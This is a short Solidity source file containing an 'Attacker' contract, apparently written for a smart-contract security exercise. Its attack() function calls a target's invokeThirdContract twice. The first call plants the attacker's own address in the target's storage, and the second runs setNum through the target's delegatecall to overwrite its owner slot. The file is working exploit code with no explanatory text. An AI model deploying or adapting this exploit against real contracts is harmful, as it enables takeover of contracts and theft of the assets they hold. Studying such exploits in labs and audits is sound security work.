// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import './TargetContract.sol';

contract Attacker {

    address public whatever;
    address public owner;

    TargetContract public targetContract;

    constructor(address _targetContract) {
        targetContract = TargetContract(_targetContract);
        owner = msg.sender;    
    }

    function setNum(uint256 _num) public {
        owner = msg.sender;
    }

    function attack() public {
        targetContract.invokeThirdContract(uint256(uint160(address(this))));
        targetContract.invokeThirdContract(2);// whatever the parameter is, it does not matter
    }
}